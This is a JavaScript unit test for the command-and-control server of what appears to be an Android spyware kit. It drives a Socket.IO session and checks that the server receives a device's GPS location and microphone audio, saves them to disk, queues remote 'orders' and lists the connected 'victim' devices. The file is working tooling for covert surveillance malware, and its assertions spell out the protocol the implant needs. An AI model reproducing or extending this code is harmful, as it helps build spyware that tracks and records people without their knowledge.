"use strict";
/**
 * Zero-dependency unit test for the desktop C2 server protocol core.
 *
 * Starts startServer() on an ephemeral port and drives a full Engine.IO /
 * Socket.IO connect cycle with a raw HTTP client, asserting the exact wire
 * format the Android agent (socket.io-client-java 2.0.1) requires:
 *   - raw "0{...}" handshake (no length prefix, no merged CONNECT)
 *   - "40{\"sid\":...}" connect ack carrying a distinct sio sid, only after
 *     the client POSTs its "40"
 *   - "3" pong in answer to a client "2" ping
 *   - event packets ("42[...]", binary "451-..." + "b<base64>") saved to disk
 *   - orders ("42[\"order\",{...}]") delivered on the next poll
 *
 * Run:  node test/server.test.js        (or: npm test in desktop/)
 */
const http = require("http");
const fs = require("fs");
const os = require("os");
const path = require("path");
const assert = require("assert");

const { startServer } = require("../server.js");

const PORT = 43000 + Math.floor(Math.random() * 1000);
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), "c2srvtest-"));

let events = [];
let served = null;

function req(method, p, body) {
  return new Promise((resolve, reject) => {
    const r = http.request(
      { host: "127.0.0.1", port: PORT, path: p, method, timeout: 30000 },
      (res) => {
        const chunks = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () =>
          resolve({ status: res.statusCode, body: Buffer.concat(chunks) })
        );
      }
    );
    r.on("timeout", () => { r.destroy(); reject(new Error("timeout: " + p)); });
    r.on("error", reject);
    if (body) r.write(body);
    r.end();
  });
}

const get = (p) => req("GET", p);
const post = (p, b) => req("POST", p, b);
const text = (r) => r.body.toString("utf8");

function sidFrom(handshakeBody) {
  const m = /"sid":"([^"]+)"/.exec(text(handshakeBody));
  assert.ok(m, "handshake must carry a sid");
  return m[1];
}

async function main() {
  served = startServer({
    port: PORT,
    downloadDir: path.join(TMP, "dl"),
    onEvent: (v, name, data) => events.push({ v, name, data }),
    onLog: () => {},
  });

  const B = "/socket.io/?EIO=4&transport=polling&model=UnitTest&manf=Node&release=17&id=unittest1";

  // 1. handshake: raw EIO=3-style body, no length prefix
  const hs = await get(B);
  assert.strictEqual(hs.status, 200);
  assert.ok(text(hs).startsWith('0{"sid":"'), "handshake starts with 0{");
  assert.ok(!/^\d+:/.test(text(hs)), "no length-prefixed framing");
  assert.ok(text(hs).includes('"pingInterval":25000'), "pingInterval advertised");
  const eioSid = sidFrom(hs);

  // 2. connect: ack must come AFTER the 40 POST, with a DIFFERENT sid
  const p40 = await post(B + "&sid=" + eioSid, "40");
  assert.strictEqual(text(p40), "ok");
  const poll1 = await get(B + "&sid=" + eioSid);
  const ack = text(poll1);
  assert.ok(ack.startsWith('40{"sid":"'), "poll1 carries connect ack");
  const sioSid = /"sid":"([^"]+)"/.exec(ack)[1];
  assert.notStrictEqual(sioSid, eioSid, "sio sid differs from engine sid");

  // 3. engine ping -> pong
  await post(B + "&sid=" + eioSid, "2");
  const poll2 = await get(B + "&sid=" + eioSid);
  assert.strictEqual(text(poll2), "3", "client ping answered with pong");

  // 4. app-level event: 42["x0000lm", {...}] -> saved to disk + onEvent
  const lm = JSON.stringify({ enable: true, lat: 10.5, lng: 20.5, provider: "gps", accuracy: 5 });
  await post(B + "&sid=" + eioSid, '42["x0000lm",' + lm + "]");
  assert.ok(events.some((e) => e.name === "x0000lm"), "x0000lm event dispatched");
  const files = fs.readdirSync(path.join(TMP, "dl", "unittest1"));
  assert.ok(files.some((f) => f.endsWith("_x0000lm.json")), "x0000lm response saved");

  // 5. binary event (real agent shape: placeholder nested as a field):
  //    451-["x0000mc",{"name":"test.pcm","buffer":{"_placeholder":true,"num":0}}]
  await post(B + "&sid=" + eioSid,
    '451-["x0000mc",{"name":"test.pcm","buffer":{"_placeholder":true,"num":0}}]');
  await post(B + "&sid=" + eioSid, "b" + Buffer.from([1, 2, 3, 4]).toString("base64"));
  const mcEvent = events.find((e) => e.name === "x0000mc");
  assert.ok(mcEvent, "x0000mc binary event dispatched");
  assert.ok(Buffer.isBuffer(mcEvent.data.buffer), "placeholder filled with Buffer");
  assert.deepStrictEqual([...mcEvent.data.buffer], [1, 2, 3, 4], "buffer bytes intact");

  // 6. order API -> queued 42["order",{...}] delivered on next poll
  const o = await post("/api/order", JSON.stringify({ order: "lm" }));
  assert.strictEqual(o.status, 200);
  assert.ok(text(o).includes('"sent":1'), "order broadcast to 1 victim");
  const poll3 = await get(B + "&sid=" + eioSid);
  assert.strictEqual(text(poll3), '42["order",{"order":"x0000lm"}]', "order wire format");

  // 7. unknown order -> 400
  const bad = await post("/api/order", JSON.stringify({ order: "nope" }));
  assert.strictEqual(bad.status, 400);

  // 8. devices API lists the connected victim
  const devs = await get("/api/devices");
  assert.ok(text(devs).includes("unittest1"), "devices API lists victim");

  console.log("ALL TESTS PASSED  (" + events.length + " events, " +
    fs.readdirSync(path.join(TMP, "dl", "unittest1")).length + " files saved)");
  served.stop();
  fs.rmSync(TMP, { recursive: true, force: true });
  process.exit(0);
}

main().catch((e) => {
  console.error("TEST FAILURE:", e.message);
  if (served) served.stop();
  fs.rmSync(TMP, { recursive: true, force: true });
  process.exit(1);
});
